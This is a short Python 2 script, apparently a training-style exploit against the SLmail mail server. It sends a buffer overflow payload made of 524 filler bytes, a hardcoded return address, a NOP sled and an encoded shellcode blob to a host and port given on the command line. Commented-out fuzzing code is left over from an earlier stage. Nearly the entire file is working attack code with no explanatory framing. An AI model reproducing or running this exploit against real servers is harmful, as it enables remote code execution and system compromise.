#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and be incremented by 200 in order to attempt to crash SLmail.


buf =  ""
buf += "\xdb\xdf\xd9\x74\x24\xf4\x58\xba\x70\xdd\x3b\x7d\x33"
buf += "\xc9\xb1\x1f\x31\x50\x1a\x03\x50\x1a\x83\xc0\x04\xe2"
buf += "\x85\xb7\x31\x23\x54\x93\xb1\x38\xc5\x60\x6d\xd5\xeb"
buf += "\xd6\xf7\xa0\x0a\xdb\x78\x25\x97\x8c\x72\x4a\x27\xaf"
buf += "\xeb\x48\x27\x2f\xbc\xc5\xc6\x45\x5a\x8e\x58\xcb\xf5"
buf += "\xa7\xb9\xa8\x34\x37\xbc\xef\xbe\x21\xf0\x9b\x7d\x3a"
buf += "\xae\x64\x7e\xba\xf6\x0e\x7e\xd0\x03\x46\x9d\x15\xc2"
buf += "\x95\xe2\xd3\x14\x5c\x5e\x30\xb3\x2d\xa7\x7e\xbb\x41"
buf += "\xa8\x80\x32\x82\x69\x6b\x48\x84\x89\x60\xe0\x7b\x83"
buf += "\xf9\x85\x44\x63\xea\xde\xcd\x75\x93\x56\xc1\xc5\xa7"
buf += "\x5b\x5a\xa0\x68\x1b\x59\x54\x89\x63\x5c\xaa\x4a\x93"
buf += "\xe4\xab\x4a\x93\x1a\x61\xca"


#311712F3
buff = ['A'*524 + '\xf3\x12\x17\x31' + '\x90'*20 + buf ] 
#'C'*(1400-524)] 


# Maximum size of buffer.

#max_buffer = 4000

# Initial counter value.

#counter = 100

# Value to increment per attempt.

#increment = 100


#while len(buff) <= max_buffer:
#    buff.append("A"*counter)
#    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s <ip> <port>" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash app at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send(string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed at %s bytes. Make sure IP/port are correct, or check debugger for app crash." % len(string)
        sys.exit()
